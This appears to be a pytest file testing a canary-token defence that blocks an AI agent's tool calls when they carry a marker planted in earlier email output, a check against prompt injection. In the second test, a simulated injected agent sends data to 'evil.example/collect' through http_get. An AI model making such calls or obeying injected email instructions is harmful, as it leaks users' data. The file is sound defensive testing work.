"""
test_canary.py — Tests for the canary token mechanism (Policy check 3)

Verifies that:
  1. A canary is injected into tool output returned to the agent
  2. If the canary appears in a later tool call's params, the PDP blocks it
  3. Normal agent behavior (no canary propagation) is not falsely blocked

No Ollama required.
"""

import pytest
from fastapi.testclient import TestClient

import sys
sys.path.insert(0, str(__file__.replace("/tests/test_canary.py", "")))

from sensor import app, _active_canaries

client = TestClient(app)


def setup_function():
    client.post("/mode", json={"mode": "active"})
    _active_canaries.clear()


# ---------------------------------------------------------------------------
# Test 1: canary is injected into tool output
# ---------------------------------------------------------------------------

def test_canary_is_injected_into_output():
    """
    When a tool call succeeds and returns output, the PDP injects a canary
    token into the returned content. The agent sees this canary; the user prompt
    did not contain it.
    """
    payload = {
        "call_id": "canary-test-inject",
        "tool": "read_email",
        "params": {"email_id": 1},
        "output": '{"id": 1, "body": "Hi team, Q3 review deadline is Friday."}',
    }
    resp = client.post("/check", json=payload)
    assert resp.status_code == 200
    result = resp.json()

    assert result["canary"] is not None, "PDP should return the injected canary string"
    assert result["redacted_output"] is not None, "PDP should return the canary-injected output"
    assert result["canary"] in result["redacted_output"], "Canary must appear in the output"
    assert "INTERNAL-MARKER-" in result["canary"]


# ---------------------------------------------------------------------------
# Test 2: canary in subsequent call params → block
# ---------------------------------------------------------------------------

def test_canary_in_subsequent_call_is_blocked():
    """
    Simulate injection: agent reads email (canary injected), then — influenced by
    the injected instruction — attempts to call http_get with the canary in params.
    The PDP must block this as evidence of LLM influence by retrieved content.
    """
    # Step 1: Read email — canary gets injected into output
    call_id = "canary-test-step1"
    payload1 = {
        "call_id": call_id,
        "tool": "read_email",
        "params": {"email_id": 4},
        "output": "Email body with injected instruction.",
    }
    resp1 = client.post("/check", json=payload1)
    assert resp1.status_code == 200
    result1 = resp1.json()
    canary = result1["canary"]
    assert canary is not None

    # Step 2: Agent (influenced by retrieved content) calls http_get with canary in URL
    # This simulates the LLM copying content from retrieved email into a tool call
    payload2 = {
        "call_id": "canary-test-step2",
        "tool": "http_get",
        "params": {"url": f"evil.example/collect?token={canary}&data=abc"},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    assert resp2.status_code == 200
    result2 = resp2.json()

    assert result2["verdict"] == "block", (
        f"PDP should block when canary appears in params. Got: {result2}"
    )
    assert result2["check_fired"] == "check_canary"


def test_canary_in_body_param_is_blocked():
    """Canary in a non-URL param (e.g., 'body') is also detected."""
    call_id = "canary-body-step1"
    payload1 = {
        "call_id": call_id,
        "tool": "read_email",
        "params": {"email_id": 2},
        "output": "Normal email content.",
    }
    resp1 = client.post("/check", json=payload1)
    canary = resp1.json()["canary"]
    assert canary is not None

    payload2 = {
        "call_id": "canary-body-step2",
        "tool": "http_get",
        "params": {"url": "mail.internal/send", "body": f"Here is the data: {canary}"},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    assert resp2.json()["verdict"] == "block"
    assert resp2.json()["check_fired"] == "check_canary"


# ---------------------------------------------------------------------------
# Test 3: benign agent behavior does not trigger canary check
# ---------------------------------------------------------------------------

def test_benign_call_after_canary_injection_is_not_blocked():
    """
    Normal agent making a follow-up call that doesn't include the canary is
    allowed. The canary check must not FP on unrelated params.
    """
    # Inject canary
    payload1 = {
        "call_id": "canary-benign-step1",
        "tool": "read_email",
        "params": {"email_id": 1},
        "output": "Clean email, no injection.",
    }
    resp1 = client.post("/check", json=payload1)
    assert resp1.json()["canary"] is not None

    # Follow-up call with clean params — no canary present
    payload2 = {
        "call_id": "canary-benign-step2",
        "tool": "read_email",
        "params": {"email_id": 2},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    assert resp2.json()["verdict"] in ("allow",), (
        f"Benign follow-up call should not be blocked. Got: {resp2.json()}"
    )


def test_canary_check_does_not_fp_on_partial_string():
    """
    Partial canary match (e.g., 'INTERNAL-MARKER' without the unique suffix)
    should not trigger. The check requires the full unique token.
    """
    # Inject a real canary
    payload1 = {
        "call_id": "canary-partial-step1",
        "tool": "read_email",
        "params": {"email_id": 3},
        "output": "Invoice email.",
    }
    resp1 = client.post("/check", json=payload1)
    canary = resp1.json()["canary"]
    assert canary is not None

    # Call with generic 'INTERNAL-MARKER' prefix but not the actual canary
    payload2 = {
        "call_id": "canary-partial-step2",
        "tool": "http_get",
        "params": {"url": "mail.internal/api?ref=INTERNAL-MARKER-0000"},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    # Should only block if the actual unique canary is present, not a generic prefix
    # (canary is 'INTERNAL-MARKER-XXXX' with a random hex suffix — 0000 is very likely different)
    if canary != "INTERNAL-MARKER-0000":
        assert resp2.json()["verdict"] in ("allow",), (
            "Should not block on a different INTERNAL-MARKER token"
        )
